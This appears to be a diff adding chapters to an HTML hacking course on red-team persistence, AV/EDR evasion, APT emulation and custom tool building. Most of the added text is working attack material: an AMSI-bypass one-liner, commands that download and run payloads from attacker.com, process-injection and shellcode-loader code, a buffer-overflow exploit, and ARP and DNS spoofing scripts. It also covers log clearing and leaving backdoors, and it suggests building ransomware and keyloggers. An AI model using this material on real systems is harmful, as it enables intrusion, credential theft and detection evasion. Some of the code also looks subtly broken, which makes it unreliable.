+mimikatz # kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:deadbeef... /id:500 /ptt
+
+# Creates ticket valid for 10 years!
+# Survives password resets!
+
+# 9. Skeleton Key (Domain Persistence)
+# Install backdoor password on Domain Controller
+
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+
+# Now any domain user can login with password: "mimikatz"
+# Their real password still works too!
+
+# 10. Implant in Legitimate Service
+# Inject into long-running Windows service
+
+# Example: Inject into svchost.exe
+# Detection: Difficult (looks like normal svchost)</div>
+
+            <h3>Part 4: AV/EDR Evasion</h3>
+
+            <div class="code"># Modern defenses:
+# • Antivirus (signature-based)
+# • EDR (Endpoint Detection & Response - behavior-based)
+# • AMSI (AntiMalware Scan Interface - scans PowerShell/scripts)
+
+# Evasion techniques:
+
+# 1. Obfuscation
+# Modify payload so signatures don't match
+
+# Tool: Veil Framework
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil
+./Veil.py
+
+# Generate obfuscated payload:
+use Evasion
+use python/meterpreter/rev_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+generate
+
+# Creates .exe that bypasses AV
+
+# 2. AMSI Bypass
+# Disable AMSI before running PowerShell payloads
+
+# PowerShell one-liner:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Or obfuscated version:
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+# AMSI now disabled! PowerShell payloads won't be scanned
+
+# 3. In-Memory Execution
+# Never touch disk (no files for AV to scan)
+
+# Covenant: execute-assembly (runs .NET in memory)
+# Sliver: execute-shellcode (injects shellcode into process)
+
+# PowerShell:
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+
+# Downloads and executes in memory!
+
+# 4. Process Injection
+# Inject into legitimate process
+
+# C# example:
+// Open target process
+Process target = Process.GetProcessesByName("notepad")[0];
+IntPtr procHandle = OpenProcess(0x1F0FFF, false, target.Id);
+
+// Allocate memory in target
+IntPtr addr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
+
+// Write shellcode
+WriteProcessMemory(procHandle, addr, shellcode, shellcode.Length, out _);
+
+// Create thread
+CreateRemoteThread(procHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+# Shellcode now running inside notepad.exe!
+# EDR sees: notepad.exe (looks normal)
+
+# 5. Sleep Obfuscation
+# EDR scans sleeping processes
+# Solution: Encrypt beacon while sleeping
+
+# Sliver feature:
+sliver (BEACON) > sleep-obfuscation
+
+# Beacon encrypts itself before sleep
+# Decrypts on wakeup
+# EDR memory scan finds encrypted gibberish!
+
+# 6. Unhooking
+# EDR "hooks" Windows APIs to monitor calls
+# Remove hooks before executing malicious code
+
+# C# example (unhook NTDLL):
+// Read fresh ntdll.dll from disk
+byte[] ntdllBytes = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
+
+// Overwrite hooked ntdll in memory
+// Now EDR can't monitor our syscalls!
+
+# 7. Direct Syscalls
+# Bypass EDR hooks entirely by calling kernel directly
+
+# Example (x64 assembly for NtAllocateVirtualMemory):
+mov r10, rcx
+mov eax, 0x18  # Syscall number
+syscall
+ret
+
+# No userland API calls → EDR can't see it!
+
+# 8. Living Off The Land (LOLBins)
+# Use legitimate Windows tools for malicious purposes
+
+# Download file without PowerShell:
+certutil -urlcache -split -f http://attacker.com/payload.exe C:\ProgramData\payload.exe
+
+# Or:
+bitsadmin /transfer myDownload http://attacker.com/payload.exe C:\ProgramData\payload.exe
+
+# Execute payload:
+rundll32.exe C:\ProgramData\payload.dll,EntryPoint
+
+# EDR sees: "certutil.exe ran" (normal Windows tool!)
+
+# 9. Shellcode Loaders
+# Custom loader that executes shellcode
+
+# Golang loader (cross-platform, hard to reverse):
+package main
+import (
+    "syscall"
+    "unsafe"
+)
+
+func main() {
+    shellcode := []byte{0x90, 0x90, ...}  // Your shellcode
+    
+    addr, _, _ := syscall.Syscall(syscall.VirtualAlloc, 4,
+        0, uintptr(len(shellcode)), 0x3000, 0x40)
+    
+    syscall.Syscall(syscall.RtlCopyMemory, 3,
+        addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+    
+    syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+# Compile:
+GOOS=windows go build -ldflags="-s -w" loader.go
+
+# No suspicious imports, custom loader, harder to detect!</div>
+
+            <h3>Part 5: APT Emulation</h3>
+
+            <div class="code"># APT = Advanced Persistent Threat (nation-state hackers)
+
+# Framework: MITRE ATT&CK
+# https://attack.mitre.org/
+
+# APT28 (Fancy Bear, Russia) TTPs:
+
+# Initial Access:
+# - Spearphishing (T1566)
+# - Watering hole attacks (T1189)
+
+# Execution:
+# - PowerShell (T1059.001)
+# - WMI (T1047)
+
+# Persistence:
+# - Registry Run Keys (T1547.001)
+# - Scheduled Tasks (T1053.005)
+
+# Privilege Escalation:
+# - Bypass UAC (T1548.002)
+# - Exploit vulnerability (T1068)
+
+# Defense Evasion:
+# - Obfuscated Files (T1027)
+# - Process Injection (T1055)
+
+# Credential Access:
+# - LSASS Memory Dump (T1003.001)
+# - Credential from Registry (T1003.002)
+
+# Discovery:
+# - Network Service Scanning (T1046)
+# - Domain Trust Discovery (T1482)
+
+# Lateral Movement:
+# - Remote Desktop Protocol (T1021.001)
+# - Windows Admin Shares (T1021.002)
+
+# Collection:
+# - Archive Collected Data (T1560)
+# - Email Collection (T1114)
+
+# Exfiltration:
+# - Exfiltration Over C2 Channel (T1041)
+
+# Emulating APT28 red team exercise:
+
+# Day 1: Initial Access
+# Send spearphishing email with malicious Word doc
+# (Contains macro that downloads Covenant beacon)
+
+# Day 2: Establish Foothold
+# Beacon calls home
+# Execute post-exploitation:
+#   - Dump credentials (Mimikatz)
+#   - Establish persistence (WMI subscription)
+#   - Enumerate domain (PowerView)
+
+# Day 3: Lateral Movement
+# Found domain admin credentials
+# Move to Domain Controller via WMI:
+wmic /node:DC01 /user:admin /password:pass process call create "rundll32.exe C:\ProgramData\beacon.dll,Start"
+
+# Day 4: Domain Dominance
+# Dump krbtgt hash (DCSync)
+# Create Golden Ticket
+# Now persistent access for years!
+
+# Day 5: Exfiltration
+# Exfiltrate data slowly (100MB/day)
+# Use DNS tunneling to avoid detection
+# Encrypt data before exfil
+
+# Day 6: Cover Tracks
+# Clear logs
+# Remove obvious persistence (keep WMI subscription)
+# Document findings for report
+
+# Tools for APT emulation:
+
+# Atomic Red Team (automated TTPs):
+git clone https://github.com/redcanaryco/atomic-red-team.git
+cd atomic-red-team
+Invoke-AtomicTest T1003.001  # LSASS dump
+
+# Caldera (autonomous red team):
+git clone https://github.com/mitre/caldera.git
+cd caldera
+python3 server.py --insecure
+
+# Access: http://localhost:8888
+# Creates automated adversary that emulates APT campaigns!
+
+# Mythic (multi-platform C2):
+# Supports Windows, Linux, macOS
+# Plugin-based architecture
+# Customizable profiles for different APTs</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're a Red Team Operator!</h4>
+                <p>You've mastered:<br><br>
+                ✅ <strong>C2 Frameworks:</strong> Covenant, Sliver, listener setup, payload generation, session management<br>
+                ✅ <strong>OPSEC:</strong> Infrastructure isolation, domain fronting, traffic obfuscation, attribution evasion<br>
+                ✅ <strong>Persistence:</strong> Registry keys, scheduled tasks, WMI subscriptions, Golden Tickets, Skeleton Key<br>
+                ✅ <strong>Evasion:</strong> AMSI bypass, in-memory execution, process injection, unhooking, direct syscalls<br>
+                ✅ <strong>APT Emulation:</strong> MITRE ATT&CK, real-world TTPs, phased operations<br><br>
+                <strong>Red Team Engagement Phases:</strong><br>
+                1. <strong>Planning:</strong> Define objectives, rules of engagement, OPSEC plan<br>
+                2. <strong>Initial Access:</strong> Phishing, exploit, physical access<br>
+                3. <strong>Establish Foothold:</strong> C2 callback, persistence, credential dumping<br>
+                4. <strong>Escalate Privileges:</strong> Local admin → Domain admin<br>
+                5. <strong>Lateral Movement:</strong> Spread to high-value targets<br>
+                6. <strong>Achieve Objectives:</strong> Exfiltrate data, plant flags, test detection<br>
+                7. <strong>Cover Tracks:</strong> Remove obvious indicators, keep subtle backdoors<br>
+                8. <strong>Report:</strong> Document TTPs used, detection gaps, remediation advice<br><br>
+                <strong>Career paths:</strong><br>
+                • Red Team Operator (offensive security)<br>
+                • Purple Team (red team + blue team collaboration)<br>
+                • Threat Intelligence (understanding APT TTPs)<br>
+                • Security Researcher (finding new evasion techniques)<br><br>
+                You now think like a nation-state hacker. Use this power responsibly! 🎭🚀</p>
+            </div>
         </section>
 
         <!-- SECTION 9: Custom Tool Development -->
         <section id="custom-tools" class="section">
             <h2 class="section-title">Custom Tool Development</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Off-the-shelf tools are great, but they have limitations: detected by AV, lack specific features you need, or don't fit your workflow. The ultimate hacker skill: building your own tools! This section teaches Python exploit development, Scapy packet manipulation, custom scanner creation, automation scripts, and tool integration. You'll learn to build port scanners, vulnerability scanners, exploit frameworks, credential harvesters, and anything else you can imagine. By the end, you'll never be limited by existing tools again!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Custom Tools = Your Hacking Superpower</h4>
+                <p><strong>Why build custom tools?</strong><br><br>
+                • <strong>Stealth:</strong> AV doesn't have signatures for YOUR code<br>
+                • <strong>Flexibility:</strong> Add features tailored to your target<br>
+                • <strong>Speed:</strong> Automate repetitive tasks<br>
+                • <strong>Learning:</strong> Understand tools by rebuilding them<br>
+                • <strong>Integration:</strong> Connect tools that don't normally work together<br><br>
+                <strong>Real-world examples:</strong><br>
+                • Metasploit started as HD Moore's custom scanner<br>
+                • Burp Suite started as PortSwigger's custom proxy<br>
+                • Nmap started as Fyodor's custom port scanner<br><br>
+                Every major tool started as someone's custom script! 🚀</p>
+            </div>
+
+            <h3>Part 1: Python Exploit Development</h3>
+
+            <div class="code"># Python is THE language for exploit development:
+# • Easy to learn, fast to prototype<br>
+# • Rich library ecosystem (sockets, HTTP, crypto)<br>
+# • Platform-independent<br>
+# • Integration with other tools
+
+# Basic exploit template:
+
+from pwn import *  # pwntools library
+
+# Target configuration
+host = '192.168.1.100'
+port = 9999
+
+# Connect to target
+r = remote(host, port)
+
+# Receive banner
+banner = r.recvuntil(b'>')
+log.info(f"Banner: {banner}")
+
+# Build exploit payload
+offset = 112  # Buffer overflow offset
+eip_value = p32(0x41414141)  # Return address
+shellcode = asm(shellcraft.linux.sh())  # Generate shellcode
+
+payload = b'A' * offset
+payload += eip_value
+payload += shellcode
+
+# Send exploit
+log.info("Sending payload...")
+r.send(payload)
+
+# Interact with shell
+r.interactive()
+
+# Example: Buffer overflow exploit for vulnerable server
+
+from socket import *
+from struct import pack
+
+target_ip = '192.168.1.100'
+target_port = 9999
+
+# Bad characters to avoid (nullbytes, newlines, etc.)
+bad_chars = b'\x00\x0a\x0d'
+
+# msfvenom generated shellcode (reverse shell)
+shellcode = (
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+
+# NOP sled (\x90 = NOP instruction)
+nops = b'\x90' * 16
+
+# Return address (JMP ESP address from binary)
+ret_addr = pack('<I', 0x625011af)  # Little-endian
+
+# Build payload
+buffer_size = 524
+padding = buffer_size - len(shellcode) - len(nops)
+
+exploit = nops + shellcode
+exploit += b'A' * padding
+exploit += ret_addr
+
+# Send exploit
+sock = socket(AF_INET, SOCK_STREAM)
+sock.connect((target_ip, target_port))
+sock.send(exploit)
+sock.close()
+
+print("[+] Exploit sent! Check listener for shell.")
+
+# Advanced: Format string exploit
+
+# Vulnerable code:
+# printf(user_input);  // No format specifier!
+
+# Exploitation:
+payload = b"%x." * 20  # Leak stack values
+# Or:
+payload = b"%s%s%s%s"  # Crash (read from invalid addresses)
+# Or:
+payload = b"%n"  # Write to memory!
+
+# Example format string exploit:
+target_addr = 0x08049000  # GOT entry to overwrite
+shellcode_addr = 0xbffff000
+
+# Write shellcode_addr to target_addr:
+payload = p32(target_addr)
+payload += b"%" + str(shellcode_addr - 4).encode() + b"x"
+payload += b"%n"
+
+# This overwrites GOT entry with our shellcode address!
+
+# Heap overflow exploit:
+
+# Vulnerable code:
+# char *buf1 = malloc(100);
+# char *buf2 = malloc(100);
+# strcpy(buf1, user_input);  // No bounds check!
+
+# Exploitation (unlink attack):
+# Overwrite heap metadata to write shellcode address to GOT
+
+payload = b'A' * 100  # Fill first chunk
+payload += p32(0xffffffff)  # Size field (prevent coalescing)
+payload += p32(0x0804a000)  # FD (forward pointer)
+payload += p32(0x0804a004)  # BK (backward pointer)
+# When free() is called, FD->BK = BK and BK->FD = FD
+# This writes to arbitrary memory!</div>
+
+            <h3>Part 2: Scapy - Packet Manipulation Master</h3>
+
+            <div class="code"># Scapy = Python library for network packet manipulation
+
+from scapy.all import *
+
+# Install:
+# pip3 install scapy
+
+# Basic packet creation:
+pkt = IP(dst="192.168.1.1")/ICMP()
+send(pkt)
+
+# Or with reply:
+reply = sr1(pkt)
+print(reply.show())
+
+# TCP SYN scan (like nmap):
+
+def syn_scan(target, ports):
+    open_ports = []
+    for port in ports:
+        pkt = IP(dst=target)/TCP(dport=port, flags='S')
+        reply = sr1(pkt, timeout=1, verbose=0)
+        
+        if reply and reply.haslayer(TCP):
+            if reply[TCP].flags == 'SA':  # SYN-ACK = open
+                open_ports.append(port)
+                # Send RST to close connection cleanly
+                rst = IP(dst=target)/TCP(dport=port, flags='R')
+                send(rst, verbose=0)
+    
+    return open_ports
+
+result = syn_scan('192.168.1.100', range(1, 1025))
+print(f"Open ports: {result}")
+
+# ARP spoofing (MITM attack):
+
+def arp_spoof(target_ip, gateway_ip):
+    target_mac = getmacbyip(target_ip)
+    gateway_mac = getmacbyip(gateway_ip)
+    
+    # Tell target: "I am the gateway"
+    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                     psrc=gateway_ip)
+    
+    # Tell gateway: "I am the target"
+    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                      psrc=target_ip)
+    
+    while True:
+        send(arp_target, verbose=0)
+        send(arp_gateway, verbose=0)
+        time.sleep(2)
+
+# Usage:
+# arp_spoof('192.168.1.10', '192.168.1.1')
+# Now all traffic from .10 routes through you!
+
+# DNS spoofing:
+
+def dns_spoof(pkt):
+    if pkt.haslayer(DNSQR):  # DNS query
+        qname = pkt[DNSQR].qname.decode()
+        
+        if 'bank.com' in qname:
+            # Forge DNS response
+            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                         UDP(dport=pkt[UDP].sport, sport=53)/\
+                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                             an=DNSRR(rrname=qname, ttl=10, rdata='10.0.0.5'))
+            send(spoofed_pkt, verbose=0)
+            print(f"[+] Spoofed DNS for {qname} → 10.0.0.5")
+
+sniff(filter="udp port 53", prn=dns_spoof)
+
+# Custom protocol fuzzing:
+
+def fuzz_protocol(target, port):
+    payloads = [
+        b'A' * 100,
+        b'A' * 1000,
+        b'A' * 10000,
+        b'%s%s%s%s',
+        b'\xff\xff\xff\xff',
+        b'\x00' * 100,
+    ]
+    
+    for payload in payloads:
+        try:
+            pkt = IP(dst=target)/TCP(dport=port)/Raw(load=payload)
+            reply = sr1(pkt, timeout=2, verbose=0)
+            
+            if not reply:
+                print(f"[!] No reply for payload: {payload[:20]}...")
+            elif reply.haslayer(TCP) and reply[TCP].flags == 'R':
+                print(f"[!] Connection reset: {payload[:20]}...")
+            else:
+                print(f"[+] Normal response: {payload[:20]}...")
+        except Exception as e:
+            print(f"[!] Error: {e}")
+
+# Packet sniffing with filtering:
+
+def packet_callback(pkt):
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        load = pkt[Raw].load
+        
+        # Look for credentials
+        if b'password' in load.lower() or b'user' in load.lower():
+            print(f"[!] Possible credentials:")
+            print(f"    Source: {pkt[IP].src}:{pkt[TCP].sport}")
+            print(f"    Dest: {pkt[IP].dst}:{pkt[TCP].dport}")
+            print(f"    Data: {load[:100]}")
+
+sniff(prn=packet_callback, filter="tcp", store=0)
+
+# Generate malformed packets:
+
+# Malformed TCP (conflicting flags):
+weird_pkt = IP(dst='192.168.1.100')/TCP(flags='SFPURAE')  # All flags!
+send(weird_pkt)
+
+# Malformed IP (invalid header length):
+weird_ip = IP(dst='192.168.1.100', ihl=2)/ICMP()  # ihl should be >= 5
+send(weird_ip)
+
+# Land attack (same src/dst):
+land = IP(src='192.168.1.100', dst='192.168.1.100')/TCP(sport=139, dport=139, flags='S')
+send(land)  # Some systems crash!
+
+# Ping of death:
+ping_of_death = fragment(IP(dst='192.168.1.100')/ICMP()/('X'*60000))
+send(ping_of_death)  # Fragments > 65535 bytes</div>
+
+            <h3>Part 3: Building a Custom Vulnerability Scanner</h3>
+
+            <div class="code"># Let's build a multi-threaded vulnerability scanner!
+
+import socket
+import threading
+import queue
+from concurrent.futures import ThreadPoolExecutor
+
+class VulnScanner:
+    def __init__(self, target, threads=10):
+        self.target = target
+        self.threads = threads
+        self.results = []
+    
+    def check_sql_injection(self, url):
+        """Test for SQL injection"""
+        payloads = ["'", '"', '1=1', "' OR '1'='1", '" OR "1"="1']
+        
+        for payload in payloads:
+            test_url = f"{url}?id={payload}"
+            try:
+                response = requests.get(test_url, timeout=5)
+                
+                # Check for SQL errors
+                errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']
+                for error in errors:
+                    if error in response.text.lower():
+                        return f"[!] SQL Injection found: {test_url}"
+            except:
+                pass
+        return None
+    
+    def check_xss(self, url):
+        """Test for XSS"""
+        payload = "<script>alert('XSS')</script>"
+        test_url = f"{url}?q={payload}"
+        
+        try:
+            response = requests.get(test_url, timeout=5)
+            if payload in response.text:
+                return f"[!] XSS found: {test_url}"
+        except:
+            pass
+        return None
+    
+    def check_open_redirect(self, url):
+        """Test for open redirect"""
+        payload = "http://evil.com"
+        test_url = f"{url}?redirect={payload}"
+        
+        try:
+            response = requests.get(test_url, allow_redirects=False, timeout=5)
+            if response.status_code in [301, 302]:
+                location = response.headers.get('Location', '')
+                if payload in location:
+                    return f"[!] Open redirect found: {test_url}"
+        except:
+            pass
+        return None
+    
+    def check_lfi(self, url):
+        """Test for Local File Inclusion"""
+        payloads = [
+            "../../../../etc/passwd",
+            "..\\..\\..\\..\\windows\\win.ini",
+            "/etc/passwd",
+            "C:\\Windows\\win.ini"
+        ]
+        
+        for payload in payloads:
+            test_url = f"{url}?file={payload}"
+            try:
+                response = requests.get(test_url, timeout=5)
+                if 'root:' in response.text or '[extensions]' in response.text:
+                    return f"[!] LFI found: {test_url}"
+            except:
+                pass
+        return None
+    
+    def check_ssrf(self, url):
+        """Test for Server-Side Request Forgery"""
+        # Use Burp Collaborator or similar
+        payload = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
+        test_url = f"{url}?url={payload}"
+        
+        try:
+            response = requests.get(test_url, timeout=5)
+            if 'ami-id' in response.text or 'instance-id' in response.text:
+                return f"[!] SSRF found (AWS metadata): {test_url}"
+        except:
+            pass
+        return None
+    
+    def scan(self, url):
+        """Run all checks"""
+        checks = [
+            self.check_sql_injection,
+            self.check_xss,
+            self.check_open_redirect,
+            self.check_lfi,
+            self.check_ssrf
+        ]
+        
+        for check in checks:
+            result = check(url)
+            if result:
+                self.results.append(result)
+    
+    def run(self, urls):
+        """Scan multiple URLs with threading"""
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            executor.map(self.scan, urls)
+        
+        return self.results
+
+# Usage:
+scanner = VulnScanner('example.com', threads=20)
+urls = [
+    'http://example.com/page1.php',
+    'http://example.com/page2.php',
+    'http://example.com/admin.php'
+]
+
+results = scanner.run(urls)
+for result in results:
+    print(result)
+
+# Enhanced port scanner with service detection:
+
+import socket
+import sys
+from datetime import datetime
+
+class AdvancedScanner:
+    def __init__(self, target):
+        self.target = target
+        self.open_ports = {}
+    
+    def scan_port(self, port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((self.target, port))
+            
+            if result == 0:
+                service = self.grab_banner(sock, port)
+                self.open_ports[port] = service
+            
+            sock.close()
+        except Exception as e:
+            pass
+    
+    def grab_banner(self, sock, port):
+        try:
+            # Try to get banner
+            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
+            banner = sock.recv(1024).decode('utf-8', errors='ignore')
+            return banner.split('\n')[0] if banner else 'Unknown'
+        except:
+            # Use common port mapping
+            services = {
+                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
+                53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
+                443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 3389: 'RDP',
+                5432: 'PostgreSQL', 6379: 'Redis', 8080: 'HTTP-Proxy',
+                27017: 'MongoDB'
+            }
+            return services.get(port, 'Unknown')
+    
+    def scan_range(self, start_port, end_port):
+        print(f"[*] Scanning {self.target} from port {start_port} to {end_port}")
+        print(f"[*] Started at {datetime.now()}")
+        
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            executor.map(self.scan_port, range(start_port, end_port + 1))
+        
+        print(f"[*] Finished at {datetime.now()}")
+        print(f"\n[+] Open ports:")
+        for port, service in sorted(self.open_ports.items()):
+            print(f"    {port}/tcp    {service}")
+
+# Usage:
+scanner = AdvancedScanner('192.168.1.100')
+scanner.scan_range(1, 1000)</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're a Tool Builder!</h4>
+                <p>You've mastered:<br><br>
+                ✅ <strong>Python Exploits:</strong> Buffer overflows, format strings, heap exploits, shellcode integration<br>
+                ✅ <strong>Scapy:</strong> Packet crafting, ARP spoofing, DNS spoofing, protocol fuzzing, custom scans<br>
+                ✅ <strong>Custom Scanners:</strong> Multi-threaded scanning, vuln detection, service enumeration<br><br>
+                <strong>Tool ideas to build:</strong><br>
+                • Subdomain enumeration tool<br>
+                • Credential stuffing tool<br>
+                • Custom C2 framework<br>
+                • Automated phishing framework<br>
+                • WiFi deauth tool<br>
+                • Ransomware PoC (for research!)<br>
+                • Keylogger<br>
+                • Browser password extractor<br><br>
+                The only limit is your imagination! Every tool you build makes you more powerful. 🛠️🚀</p>
+            </div>
         </section>
 
         <!-- SECTION 10: Physical Security & Social Engineering -->
